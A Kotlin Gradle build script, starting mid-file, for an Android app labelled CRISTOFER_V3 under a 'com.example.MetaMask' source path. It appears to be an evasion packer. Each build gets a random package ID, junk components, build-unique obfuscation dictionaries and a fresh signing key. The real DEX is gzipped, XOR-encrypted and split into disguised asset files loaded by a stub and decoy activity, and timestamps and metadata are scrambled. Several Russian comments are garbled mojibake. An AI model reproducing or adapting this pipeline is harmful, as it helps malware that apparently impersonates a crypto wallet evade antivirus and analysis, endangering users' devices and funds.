                    "Activity" -> "override fun onCreate(s:android.os.Bundle?){super.onCreate(s);exec()}"
                    "Service"  -> "override fun onStartCommand(i:android.content.Intent?,f:Int,s:Int):Int{exec();return android.app.Service.START_NOT_STICKY}\noverride fun onBind(i:android.content.Intent?)=null"
                    else       -> "override fun onCreate():Boolean{exec();return true}\noverride fun query(u:android.net.Uri,p:Array<String>?,s:String?,a:Array<String>?,o:String?)=null\noverride fun getType(u:android.net.Uri)=null\noverride fun insert(u:android.net.Uri,v:android.content.ContentValues?)=null\noverride fun delete(u:android.net.Uri,s:String?,a:Array<String>?)=0\noverride fun update(u:android.net.Uri,v:android.content.ContentValues?,s:String?,a:Array<String>?)=0"
                }
                junkDir.resolve("$name.kt").writeText("""
package $junkPkg
class $name : $base() {
    $lifecycle
    $extraMethods
    private fun exec(): Long {
        ${genExecKotlin(v)}
    }
}""".trimIndent())
            } else {
                val v = "jv${rndId(4)}"
                val base = when(type) {
                    "Activity" -> "android.app.Activity"
                    "Service"  -> "android.app.Service"
                    else       -> "android.content.ContentProvider"
                }
                val lifecycle = when(type) {
                    "Activity" -> "@Override protected void onCreate(android.os.Bundle b){super.onCreate(b);exec();}"
                    "Service"  -> "@Override public int onStartCommand(android.content.Intent i,int f,int s){exec();return START_NOT_STICKY;}\n@Override public android.os.IBinder onBind(android.content.Intent i){return null;}"
                    else       -> "@Override public boolean onCreate(){exec();return true;}\n@Override public android.database.Cursor query(android.net.Uri u,String[] p,String s,String[] a,String o){return null;}\n@Override public String getType(android.net.Uri u){return null;}\n@Override public android.net.Uri insert(android.net.Uri u,android.content.ContentValues v){return null;}\n@Override public int delete(android.net.Uri u,String s,String[] a){return 0;}\n@Override public int update(android.net.Uri u,android.content.ContentValues v,String s,String[] a){return 0;}"
                }
                val extraJavaMethods = if (junkUtilPool.isNotEmpty()) {
                    val u = junkUtilPool.random(); val m = u.methods.random()
                    "private long helper${rndId(4)}(long x){return ${u.fqn}.INSTANCE.${m}(x);}"
                } else ""
                junkDir.resolve("$name.java").writeText("package $junkPkg;\npublic class $name extends $base{\n$lifecycle\n$extraJavaMethods\nprivate long exec(){\n${genExecJava(v)}\n}}")
            }
        }

        val helperTemplates = listOf(
            "analytics" to "fun track(event: String, params: Map<String, Any> = emptyMap()): Long { var acc = event.hashCode().toLong(); params.forEach { (k,_) -> acc = acc xor k.hashCode().toLong() }; return acc }",
            "config"    to "fun get(key: String, def: String = \"\"): String = cache.getOrDefault(key, def)",
            "logger"    to "fun log(msg: String): Long { val h = msg.hashCode().toLong(); return if (enabled) h xor ${(1L..Long.MAX_VALUE/2).random()} else h }",
            "network"   to "fun isReachable(host: String = \"localhost\"): Boolean = host.isNotEmpty()",
            "cache"     to "fun put(k: String, v: String): Long { store[k] = v; return k.hashCode().toLong() xor v.hashCode().toLong() }",
            "datetime"  to "fun now(): String = java.text.SimpleDateFormat(\"yyyyMMdd_HHmmss\", java.util.Locale.US).format(java.util.Date())",
            "crypto"    to "fun xor(data: ByteArray, key: Byte): ByteArray = data.map { (it.toInt() xor key.toInt()).toByte() }.toByteArray()",
            "prefs"     to "fun read(ctx: android.content.Context, k: String): String = ctx.getSharedPreferences(\"d\", 0).getString(k, \"\") ?: \"\"",
            "metrics"   to "fun elapsed(start: Long): Long = System.nanoTime() - start",
            "strings"   to "fun cap(s: String): String = s.replaceFirstChar { it.uppercase() }"
        )
        helperTemplates.shuffled().take((5..8).random()).forEach { (tag, method) ->
            val clsName = "${tag.replaceFirstChar{it.uppercase()}}Mgr_${rndSuffix()}"
            val crossCall = if (junkUtilPool.isNotEmpty()) {
                val u = junkUtilPool.random(); val m = u.methods.random()
                "\nfun warmup(): Long = ${u.fqn}.$m()"
            } else ""
            junkDir.resolve("$clsName.kt").writeText("""
package $junkPkg
object $clsName {
    private val enabled = true
    private val cache = mutableMapOf(${(1..2).random().let { n -> (1..n).joinToString(",") { "\"${rndId(5)}\" to \"${UUID.randomUUID()}\"" } }})
    private val store = mutableMapOf<String, String>()
    $method$crossCall
}""".trimIndent())
        }

        repeat((4..8).random()) {
            val bname = "Breaker${UUID.randomUUID().toString().replace("-","").take(6).replaceFirstChar { it.uppercase() }}"
            val mc = (20..40).random()
            val sb = StringBuilder("package $junkPkg;\npublic class $bname {\n")
            repeat(mc) { m ->
                if (junkUtilPool.isNotEmpty() && m % ((2..4).random()) == 0) {
                    val u = junkUtilPool.random(); val mth = u.methods.random()
                    sb.append("    public long m$m(long x){ return ${u.fqn}.INSTANCE.${mth}(x); }\n")
                } else {
                    sb.append("    public void m$m(){}\n")
                }
            }
            sb.append("}\n")
            junkDir.resolve("$bname.java").writeText(sb.toString())
        }

        dynamicProguardRules.parentFile.mkdirs()
        dynamicProguardRules.writeText("""
# ── NativeBridge JNI: сохраняем только native-методы ──
-keepclasseswithmembernames class $randomPkg.$CLS_NATIVE_BRIDGE {
    native <methods>;
}

# ── Enums: reflection через values()/valueOf() ──
-keepclassmembers enum $randomPkg.** {
    public static **[] values();
    public static ** valueOf(java.lang.String);
}

# ── Android-компоненты из Manifest: AGP генерирует keep автоматически.
#    Условный Manifest уже исключает компоненты disabled-модулей.
#    R8 shrinking удалит unreachable классы (BuildConfig.FEAT_XXX=false → dead code).

# ── Junk-компоненты в манифесте ──
-keep class $junkPkg.** { *; }
-keepclassmembers class $junkPkg.** { public void *(); }

# в"Ђв"Ђ JNI-РјРѕСЃС‚ в"Ђв"Ђ
-keep class com.yourcompany.** { *; }
-keepnames class com.yourcompany.** { *; }
-keep class com.yourcompany.core.jni.$CLS_NATIVE_BRIDGE { *; }
-keep class com.yourcompany.internal.SystemActionCallback { *; }
-keep interface com.yourcompany.internal.TaskResultListener { *; }

${if (featFcm) "# -- Firebase / GMS --\n-keep class com.google.firebase.** { *; }\n-keep class com.google.android.gms.** { *; }\n-dontwarn com.google.firebase.**\n-dontwarn com.google.android.gms.**" else "# FCM disabled -- Firebase rules omitted\n-dontwarn com.google.firebase.**\n-dontwarn com.google.android.gms.**"}

# в"Ђв"Ђ R8-РѕРїС‚РёРјРёР·Р°С†РёСЏ: РєРѕРјРїСЂРѕРјРёСЃСЃ РґР»СЏ СЃРѕРІРјРµСЃС‚РёРјРѕСЃС‚Рё СЃ VMOS/РЅРµСЃС‚Р°РЅРґР°СЂС‚РЅС‹РјРё ROM в"Ђв"Ђ
# -dontoptimize РІРѕР·РІСЂР°С‰С‘РЅ РґР»СЏ СЃРѕРІРјРµСЃС‚РёРјРѕСЃС‚Рё: Р°РіСЂРµСЃСЃРёРІРЅР°СЏ РѕРїС‚РёРјРёР·Р°С†РёСЏ Р»РѕРјР°РµС‚ РєР»Р°СЃСЃС‹
# РЅР° VMOS Рё РґСЂСѓРіРёС… СЌРјСѓР»СЏС‚РѕСЂР°С…. РћР±С„СѓСЃРєР°С†РёСЏ (РїРµСЂРµРёРјРµРЅРѕРІР°РЅРёРµ, StringFog) РІСЃС‘ СЂР°РІРЅРѕ СЂР°Р±РѕС‚Р°РµС‚.
-dontoptimize
""".trimIndent())

        println("--- [CRISTOFER_V3] appId=$randomPkg v$rndVersionName ($rndVersionCode) SO=$SO_NAME junk=${allComps.size}comps strRes=$rndStrCount ---")
    }
}

if (isRandomizedBuild) {
    tasks.named("preBuild").configure { dependsOn("prepareAndRandomizeSources") }
}

val generateObfDictionaries = tasks.register("generateObfDictionaries") {
    outputs.upToDateWhen { false }
    doLast {
        val sr = SecureRandom()
        val seedBytes = ByteArray(32).also { sr.nextBytes(it) }
        val seed = seedBytes.foldIndexed(0L) { i, acc, b -> acc xor ((b.toLong() and 0xFF) shl (i % 8 * 8)) }
        val rng  = Random(seed)

        val cons  = "bcdfghjklmnpqrstvwxz".toCharArray()
        val vows  = "aeiou".toCharArray()
        val used  = mutableSetOf<String>()

        fun nextRaw(minSyl: Int, maxSyl: Int): String {
            while (true) {
                val sylCount = minSyl + rng.nextInt(maxSyl - minSyl + 1)
                val sb = StringBuilder(sylCount * 2)
                repeat(sylCount) {
                    sb.append(cons[rng.nextInt(cons.size)])
                    sb.append(vows[rng.nextInt(vows.size)])
                }
                val n = sb.toString()
                if (used.add(n)) return n
            }
        }

        val obfDir = layout.buildDirectory.dir("obf").get().asFile.also { it.mkdirs() }

        obfDir.resolve("dict_classes.txt").writeText(
            (1..10_000).joinToString("\n") { nextRaw(2, 6).replaceFirstChar { c -> c.uppercaseChar() } }
        )
        obfDir.resolve("dict_methods.txt").writeText(
            (1..10_000).joinToString("\n") { nextRaw(2, 5) }
        )
        obfDir.resolve("dict_packages.txt").writeText(
            (1..3_000).joinToString("\n") { nextRaw(1, 3) }
        )

        println("--- [OBF-DICT] Build-unique dictionaries generated via SecureRandom (seed never repeats) ---")
    }
}

tasks.whenTaskAdded {
    if (name == "minifyReleaseWithR8") dependsOn(generateObfDictionaries)
}

tasks.register<JavaCompile>("compileFlipAll") {
    source = fileTree("tools") { include("FlipZipFlagAll.java") }
    destinationDirectory.set(file(flipOutDir))
    classpath = files(); sourceCompatibility = "11"; targetCompatibility = "11"; options.encoding = "UTF-8"
}

tasks.register("runFlipAndSign") {
    dependsOn("compileFlipAll")
    doLast {
        val baseApk = file(outDir).walk().find { it.name.endsWith(".apk") && !it.name.contains("relis") && !it.name.contains("flagged") && it.name.contains("release") }
            ?: return@doLast
        val flaggedApk = "$outDir/flagged.apk"
        val alignedApk = "$outDir/aligned.apk"
        val finalApk   = "$outDir/relis.apk"

        stripApkMetaData(baseApk)
        javaexec { mainClass.set("FlipZipFlagAll"); classpath = files(flipOutDir); args = listOf(baseApk.absolutePath, flaggedApk) }
        runCmd(listOf(ZIPALIGN, "-p", "-f", "4", flaggedApk, alignedApk))
        randomizeZipTimestamps(file(alignedApk))

        val (ks, al, pw) = generateUniqueKey("release_${rndId(4)}")
        val signerCmd = if (isWindows) listOf("cmd","/c",APKSIGNER) else listOf(APKSIGNER)
        runCmd(signerCmd + listOf("sign","--ks",ks,"--ks-key-alias",al,"--ks-pass","pass:$pw","--out",finalApk,alignedApk))

        file(flaggedApk).delete(); file(alignedApk).delete()
        val mb = "%.1f".format(file(finalApk).length() / 1048576.0)
        println("--- [CRISTOFER_V3] Final APK: $finalApk (${mb}MB) pkg=$randomPkg ---")
    }
}

val PACK_OUT_DIR = layout.buildDirectory.dir("pack-out").get().asFile
val PACK_STUB_DEX = File(PACK_OUT_DIR, "stub-classes.dex")

tasks.register("compileStubDex") {
    outputs.upToDateWhen { false }
    doLast {
        PACK_OUT_DIR.deleteRecursively(); PACK_OUT_DIR.mkdirs()

        val srcRoot = File(PACK_OUT_DIR, "src").also { it.mkdirs() }
        val pkgDir = File(srcRoot, randomPkg.replace(".", "/")).also { it.mkdirs() }

        val stubSrc = project.projectDir.resolve("pack/stub/StubApp.java")
        if (!stubSrc.exists()) throw GradleException("Stub source not found: $stubSrc")
        var code = stubSrc.readText()
        code = code
            .replace("STUB_PACKAGE_PLACEHOLDER", randomPkg)
            .replace("DEXLDR_LIBNAME_PLACEHOLDER", DEXLDR_SO_NAME)
            .replace("SECURE_LIBNAME_PLACEHOLDER", SO_NAME)
            .replace("REAL_APP_FQN_PLACEHOLDER", "$randomPkg.$CLS_MAIN_APP")
            .replace("nativeUnpack", JNI_UNPACK_SYMBOL)
            .replace("LITE_CHECK_SYMBOL_PLACEHOLDER", JNI_LITE_CHECK_SYMBOL)
            .replace("STUB_DECOY_FQN_PLACEHOLDER", "$randomPkg.$STUB_DECOY_CLS")
            .replace("class StubApp", "class $STUB_CLS")
            .replace("IMDC_ENC_BYTES", imdcEncBytes)
            .replace("IMDC_XOR_KEY", "$imdcXorKey")
        val srcFile = File(pkgDir, "$STUB_CLS.java")
        srcFile.writeText(code)

        val decoySrc = project.projectDir.resolve("pack/stub/StubDecoyActivity.java")
        if (!decoySrc.exists()) throw GradleException("Decoy source not found: $decoySrc")
        var decoyCode = decoySrc.readText()
        decoyCode = decoyCode
            .replace("STUB_PACKAGE_PLACEHOLDER", randomPkg)
            .replace("class StubDecoyActivity", "class $STUB_DECOY_CLS")
        val decoySrcFile = File(pkgDir, "$STUB_DECOY_CLS.java")
        decoySrcFile.writeText(decoyCode)

        val factorySrc = project.projectDir.resolve("pack/stub/StubAppComponentFactory.java")
        if (!factorySrc.exists()) throw GradleException("Factory source not found: $factorySrc")
        var factoryCode = factorySrc.readText()
        factoryCode = factoryCode
            .replace("STUB_PACKAGE_PLACEHOLDER", randomPkg)
            .replace("STUB_FACTORY_CLS_PLACEHOLDER", STUB_FACTORY_CLS)
        val factorySrcFile = File(pkgDir, "$STUB_FACTORY_CLS.java")
        factorySrcFile.writeText(factoryCode)

        val androidJar = "$sdkDir/platforms/android-36/android.jar"
        if (!file(androidJar).exists()) throw GradleException("android.jar not found at $androidJar")
        val classesDir = File(PACK_OUT_DIR, "classes").also { it.mkdirs() }
        val javac = if (isWindows) "javac.exe" else "javac"
        runCmd(listOf(javac,
            "-source", "8", "-target", "8",
            "-bootclasspath", androidJar,
            "-classpath", androidJar,
            "-d", classesDir.absolutePath,
            "-encoding", "UTF-8",
            srcFile.absolutePath,
            decoySrcFile.absolutePath,
            factorySrcFile.absolutePath
        ))

        val classFile = File(classesDir, "${randomPkg.replace(".", "/")}/$STUB_CLS.class")
        val decoyClassFile = File(classesDir, "${randomPkg.replace(".", "/")}/$STUB_DECOY_CLS.class")
        if (!classFile.exists()) throw GradleException("javac did not produce $classFile")
        if (!decoyClassFile.exists()) throw GradleException("javac did not produce $decoyClassFile")
        val allClassFiles = classesDir.walk()
            .filter { it.isFile && it.name.endsWith(".class") }
            .map { it.absolutePath }
            .toList()
        val d8 = "$sdkDir/build-tools/$buildToolsVer/" + if (isWindows) "d8.bat" else "d8"
        val dexOutDir = File(PACK_OUT_DIR, "dex").also { it.mkdirs() }
        if (isWindows)
            runCmd(listOf("cmd", "/c", d8, "--release",
                "--output", dexOutDir.absolutePath, "--lib", androidJar) + allClassFiles)
        else
            runCmd(listOf(d8, "--release",
                "--output", dexOutDir.absolutePath, "--lib", androidJar) + allClassFiles)
        val produced = File(dexOutDir, "classes.dex")
        if (!produced.exists()) throw GradleException("d8 did not produce classes.dex")
        produced.renameTo(PACK_STUB_DEX)
        println("--- [PACK] compileStubDex: ${PACK_STUB_DEX.length()} bytes (class=$STUB_CLS, decoy=$STUB_DECOY_CLS, factory=$STUB_FACTORY_CLS) ---")
    }
}

tasks.register("packRelease") {
    dependsOn("compileStubDex")
    outputs.upToDateWhen { false }
    doLast {
        val rawApk = file(outDir).walk().find {
            it.name.endsWith(".apk") &&
                    !it.name.contains("relis") &&
                    !it.name.contains("flagged") &&
                    !it.name.contains("aligned") &&
                    it.name.contains("release")
        } ?: throw GradleException("[PACK] raw release APK not found in $outDir")

        if (!PACK_STUB_DEX.exists()) throw GradleException("[PACK] stub DEX missing: $PACK_STUB_DEX")

        val dexMergeIn  = File(rawApk.parentFile, "dex_merge_in").apply  { deleteRecursively(); mkdirs() }
        val dexMergeOut = File(rawApk.parentFile, "dex_merge_out").apply { deleteRecursively(); mkdirs() }
        val dexNameRegex = Regex("""^classes\d*\.dex$""")
        val secDexRegex  = Regex("""^classes\d+\.dex$""")
        ZipFile(rawApk).use { zin ->
            zin.entries().toList()
                .filter { dexNameRegex.matches(it.name) }
                .forEach { e -> File(dexMergeIn, e.name).outputStream().use { zin.getInputStream(e).copyTo(it) } }
        }
        val dexInputs = dexMergeIn.listFiles { f -> dexNameRegex.matches(f.name) }!!.sortedBy { it.name }
        val mergedDexBytes: ByteArray = if (dexInputs.size == 1) {
            dexInputs[0].readBytes()
        } else {
            val isWin = System.getProperty("os.name").lowercase().contains("win")
            val d8 = "${android.sdkDirectory}/build-tools/${android.buildToolsVersion}/d8${if (isWin) ".bat" else ""}"
            val cmd = mutableListOf(d8, "--output", dexMergeOut.absolutePath) + dexInputs.map { it.absolutePath }
            println("--- [PACK] Merging ${dexInputs.size} DEX files with d8: ${dexInputs.map { it.name }} ---")
            val proc = ProcessBuilder(cmd).redirectErrorStream(true).start()
            val log  = proc.inputStream.bufferedReader().readText()
            val code = proc.waitFor()
            if (code != 0) throw GradleException("[PACK] d8 merge failed (exit=$code): $log")
            val outDexFiles = dexMergeOut.listFiles { f -> f.name.matches(Regex("""^classes\d*\.dex$""")) }
                ?.sortedBy { it.name } ?: emptyList()
            if (outDexFiles.isEmpty()) throw GradleException("[PACK] d8 produced no output DEX")
            println("--- [PACK] d8 output: ${outDexFiles.map { it.name + "(${it.length()/1024}KB)" }} ---")
            val allDexBytes = outDexFiles.map { it.readBytes() }
            if (allDexBytes.size == 1) {
                allDexBytes[0]
            } else {
                println("--- [PACK] d8 split into ${allDexBytes.size} files -- packing as multi-DEX ---")
                fun Int.le4() = byteArrayOf(and(0xFF).toByte(), (shr(8) and 0xFF).toByte(),
                    (shr(16) and 0xFF).toByte(), (shr(24) and 0xFF).toByte())
                var totalSize = 8
                for (dex in allDexBytes) totalSize += 4 + dex.size
                val result = ByteArray(totalSize)
                var pos = 0
                val magic = byteArrayOf(0x4D, 0x44, 0x58, 0x4D)
                System.arraycopy(magic, 0, result, pos, 4); pos += 4
                val cntBytes = allDexBytes.size.le4()
                System.arraycopy(cntBytes, 0, result, pos, 4); pos += 4
                for (dex in allDexBytes) {
                    val lb = dex.size.le4()
                    System.arraycopy(lb, 0, result, pos, 4); pos += 4
                    System.arraycopy(dex, 0, result, pos, dex.size); pos += dex.size
                }
                println("--- [PACK] multi-DEX payload total: ${result.size/1024}KB (${allDexBytes.size} files) ---")
                result
            }
        }
        dexMergeIn.deleteRecursively(); dexMergeOut.deleteRecursively()
        println("--- [PACK] Merged DEX size: ${mergedDexBytes.size / 1024}KB ---")

        val packedApk = File(rawApk.parentFile, "${rawApk.nameWithoutExtension}_packed.apk")
        var origDexSize = 0
        ZipFile(rawApk).use { zin ->
            ZipOutputStream(BufferedOutputStream(FileOutputStream(packedApk))).use { zout ->
                zout.setLevel(Deflater.BEST_COMPRESSION)

                val oldPayloadRegex = Regex("""^assets/[a-z0-9]{6}/[a-z0-9]{8}\.(db|bin|cache|tmp)$""")
                val entries = zin.entries().toList()
                for (e in entries) {
                    when {
                        e.name == "classes.dex" -> {
                            val orig = mergedDexBytes
                            origDexSize = orig.size
                            val compressed = ByteArrayOutputStream().also { baos ->
                                GZIPOutputStream(baos).use { gz -> gz.write(orig) }
                            }.toByteArray()
                            val enc = ByteArray(compressed.size)
                            val keyLen = PACK_XOR_KEY.size
                            for (i in compressed.indices) {
                                enc[i] = (compressed[i].toInt() xor PACK_XOR_KEY[i % keyLen].toInt()).toByte()
                            }

                            val totalLen  = enc.size
                            val part0End  = totalLen / 3
                            val part1End  = totalLen * 2 / 3
                            val splits    = listOf(0 to part0End, part0End to part1End, part1End to totalLen)
                            println("--- [PACK] DEX ${origDexSize/1024}KB в†’ gzip ${compressed.size/1024}KB в†’ enc ${enc.size/1024}KB (3 parts) ---")
                            for (pi in 0..2) {
                                val (from, to) = splits[pi]
                                val partBytes  = enc.copyOfRange(from, to)
                                val entryPath  = "assets/$PAYLOAD_FOLDER/${PAYLOAD_PART_NAMES[pi]}"
                                val pe = ZipEntry(entryPath).apply {
                                    time = System.currentTimeMillis()
                                    method = ZipEntry.STORED
                                    size = partBytes.size.toLong()
                                    compressedSize = partBytes.size.toLong()
                                    val crc = CRC32(); crc.update(partBytes); this.crc = crc.value
                                }
                                zout.putNextEntry(pe); zout.write(partBytes); zout.closeEntry()
                                println("--- [PACK] part$pi в†’ $entryPath (${partBytes.size/1024}KB) ---")
                            }

                            val stubBytes = PACK_STUB_DEX.readBytes()
                            val stubEntry = ZipEntry("classes.dex").apply { time = System.currentTimeMillis() }
                            zout.putNextEntry(stubEntry); zout.write(stubBytes); zout.closeEntry()
                        }
                        secDexRegex.matches(e.name) -> { }
                        oldPayloadRegex.matches(e.name) -> { }
                        else -> {
                            val ne = ZipEntry(e.name).apply {
                                method = e.method
                                time = e.time
                                if (e.method == ZipEntry.STORED) {
                                    size = e.size; crc = e.crc; compressedSize = e.compressedSize
                                }
                            }
                            zout.putNextEntry(ne)
                            zin.getInputStream(e).copyTo(zout)
                            zout.closeEntry()
                        }
                    }
                }
            }
        }
        if (origDexSize == 0) throw GradleException("[PACK] classes.dex was not found in raw APK")

        rawApk.delete()
        packedApk.renameTo(rawApk)

        val totalKb = rawApk.length() / 1024
        val stubKb  = PACK_STUB_DEX.length() / 1024
        val origKb  = origDexSize / 1024
        println("--- [PACK] packRelease: total=${totalKb}KB stub=${stubKb}KB orig_dex_encrypted=${origKb}KB key=${PACK_XOR_KEY.size}B ---")
    }
}

tasks.register("generateJunkSource") {
    outputs.upToDateWhen { false }
    doLast {
        val junkFile = file("src/main/java/com/example/MetaMask/JnkBuildTag.kt")
        junkFile.writeText("package com.example.MetaMask\ninternal object JnkBuildTag {\n    @JvmField val ID = \"${UUID.randomUUID()}\"\n    @JvmField val N = ${(1..99999999).random()}\n}")
        println("--- [JUNK-SRC] JnkBuildTag.kt written ---")
    }
}
tasks.named("preBuild") { dependsOn("generateJunkSource") }

afterEvaluate {
    tasks.findByName("assembleRelease")?.finalizedBy("packRelease")
    tasks.findByName("packRelease")?.finalizedBy("runFlipAndSign")
}

tasks.named<Delete>("clean") {
    delete(project.projectDir.resolve(".cxx"))
    delete(layout.buildDirectory.dir("kotlin").get().asFile)
    delete(layout.buildDirectory.dir("outputs/mapping").get().asFile)
    delete(layout.buildDirectory.dir("intermediates/r8_metadata").get().asFile)
    delete(layout.buildDirectory.dir("kotlinToolingMetadata").get().asFile)
    delete(layout.buildDirectory.file("generated_proguard_rules.pro").get().asFile)
}

dependencies {
    if (featFcm) {
        implementation(platform("com.google.firebase:firebase-bom:34.11.0"))
        implementation("com.google.firebase:firebase-common")
        implementation("com.google.firebase:firebase-messaging")
        implementation("com.google.android.gms:play-services-base:18.10.0")
    }
    implementation("androidx.cardview:cardview:1.0.0")
    implementation("androidx.activity:activity-ktx:1.13.0")
    implementation("org.java-websocket:Java-WebSocket:1.6.0")
    implementation("com.jakewharton.timber:timber:5.0.1")
    implementation("androidx.appcompat:appcompat:1.7.1")
    implementation("androidx.work:work-runtime:2.11.1")
    implementation("androidx.work:work-runtime-ktx:2.11.1")
    implementation("androidx.constraintlayout:constraintlayout:2.2.1")
    implementation("org.jetbrains.kotlinx:kotlinx-coroutines-core:1.10.2")
    implementation("org.jetbrains.kotlinx:kotlinx-coroutines-android:1.10.2")
    implementation("com.google.code.gson:gson:2.13.2")
    implementation("com.google.android.material:material:1.14.0-alpha10")
    implementation("com.squareup.okhttp3:okhttp:5.3.2")
    implementation("androidx.core:core-ktx:1.18.0")
    implementation("androidx.lifecycle:lifecycle-runtime-ktx:2.10.0")
    implementation("androidx.lifecycle:lifecycle-service:2.10.0")
    implementation("com.github.megatronking.stringfog:xor:5.0.0")
    testImplementation("junit:junit:4.13.2")
    androidTestImplementation("androidx.test.ext:junit:1.3.0")
    androidTestImplementation("androidx.test.espresso:espresso-core:3.7.0")
}
